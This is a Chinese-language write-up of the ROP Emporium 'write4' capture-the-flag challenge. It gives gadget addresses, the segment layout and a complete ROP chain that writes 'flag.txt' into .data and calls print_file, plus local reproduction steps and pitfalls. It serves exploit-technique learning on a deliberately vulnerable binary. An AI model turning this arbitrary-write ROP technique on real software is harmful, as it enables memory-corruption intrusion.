# 31 ROP Emporium `write4` 速通笔记

```text
64 位 ELF、No PIE、NX、无 canary、Partial RELRO、not stripped
pwnme / print_file 都在配套 libwrite4.so 里（RUNPATH = b'.'）
```

## 1. 为什么单独成类

| 题型 | 缺什么 | 用什么补 |
| --- | --- | --- |
| ret2text / ret2libc | 只需要控制 RIP 与参数 | `pop rdi ; ret` |
| ret2csu（30） | 缺 `pop rdx` | `__libc_csu_init` 长 pop 序列 + `call [r12+rbx*8]` |
| **rop_write_memory（本题）** | **缺一个"能用的字符串"**：`"flag.txt"` / `"/bin/sh"` 都不在内存里 | `mov qword ptr [r14], r15 ; ret` 自己做任意地址写 |

判据：**目标函数要的参数是"指向字符串的指针"，而二进制里根本没有这个字符串**
（`print_file(char *name)`、`system("/bin/sh")`、`open(path)` 都是这个形状）。
注意它和 `format_string_write` 的区别：后者是"用 `%n` 写数值"，本题是
"用 ROP gadget 把一段数据搬到可写段"。

## 2. gadget 与可写目标

| 地址 | gadget | 备注 |
| --- | --- | --- |
| `0x400690` | `pop r14 ; pop r15 ; ret` | 藏在一串 pop 里 |
| `0x400628` | `mov qword ptr [r14], r15 ; ret` | `usefulGadgets` 的第 1 条 |
| `0x400693` | `pop rdi ; ret` | |
| `0x400510` | `print_file@plt` | 参数是**文件名字符串的地址** |

反汇编证据：

```text
0000000000400628 <usefulGadgets>:
  400628:  mov    QWORD PTR [r14],r15
  40062b:  ret
```

> 坑：`ROP(e).find_gadget(['mov qword ptr [r14], r15', 'ret'])` 会返回 `None`，
> 因为这条 gadget 前后是 `nop` 填充、不在标准函数尾部，pwntools 的 gadget 扫描
> 检不到。必须手读 `objdump -d -M intel write4`（本题 `usefulGadgets` 全部 4 条都在这里）。

段布局（`readelf -SW write4`）：

```text
.data   0x601028 - 0x601037   16 B，初值全 0
.bss    0x601038 - 0x60103f    8 B
heap    从 0x601040 起（brk 起点 = _end）
```

`"flag.txt"` 恰好 8 字节：写到 **0x601028**，紧随的 `0x601030` 本来就是 0，
天然是结束符。**不要写到 `0x601038`**：那样 `0x601040` 就是 heap 起点，
`print_file` 内部 `fopen` 会 `malloc`，chunk header 正好压在我们写进去的字节上。

## 3. 利用链（96 B，`read` 上限 0x200）

```text
'A' * 40                      # pwnme: sub rsp,0x20 -> RIP 在 +0x28
pop r14 ; pop r15 ; ret       # 0x400690
  0x601028                    #   r14 = 目标地址
  "flag.txt"                  #   r15 = 8 字节字符串（flat 会原样放，不打包）
mov [r14], r15 ; ret          # 0x400628  -> *(u64*)0x601028 = "flag.txt"
pop rdi ; ret                 # 0x400693
  0x601028
print_file@plt                # 0x400510  -> print_file("flag.txt")
```

## 4. 实测坑

1. **官方 zip 解出来没有 +x 位**：用 `zipfile.extractall()` 解包后是 `-rw-r--r--`，
   `process('./write4')` 直接报 `'./write4' is not marked as executable (+x)`。
   归档时必须 `chmod +x`（本仓库已做，`ls -l` 是 `-rwxr-xr-x`）。
2. **`.data`+`.bss` 只有 24 字节**：写 8 字节 + 依赖下一个 8 字节为 0 是可行的，
   但地址一定要落在 `.data`（0x601028），写满 16 字节就会碰到 `.bss`/heap 边界。
3. `print_file` 是 `fopen(name, "r")`；文件不存在时打印 `Failed to open file: %s`
   后 `exit(1)`，所以本地必须有 `flag.txt`（官方 zip 自带，与 badchars 的是同一份）。
4. 输入走的是 `read(0, rbp-0x20, 0x200)`，**不是 `gets`**，payload 里的 `\x00`
   不会被截断——这一点在写 `p64(0)` 之类的值时才不会踩坑。

## 5. 本地复现

```bash
cd '/home/yfhd5/Pwn Writeups/rop_write_memory'
source ../.venv/bin/activate
python 31_ropemporium_write4_exp.py LOCAL
# Thank you!
# ROPE{a_placeholder_32byte_flag!}
```

远程用 `HOST=... PORT=... python 31_ropemporium_write4_exp.py`（ROP Emporium 官方
没有公开靶机，仓库默认只跑本地；`HOST`/`PORT` 支持留作自建 socat 用）。

附件来源：`https://ropemporium.com/binary/write4.zip`（zip sha256 `3925c857…`），
原始 zip 备份在 `_vendor/ropemporium/write4.zip`，清单见 `_vendor/attach_manifest.md`。

## 6. 识别卡

```text
有 "mov [reg_a], reg_b ; ret" 之类的任意写 gadget
+ 目标函数要一个字符串指针（print_file / system / open）
  -> rop_write_memory：先把字符串写进 .data/.bss，再 pop rdi 传地址
写 8 字节时确认后面有 \0；目标段紧邻 heap 时不要写 heap 起点
```
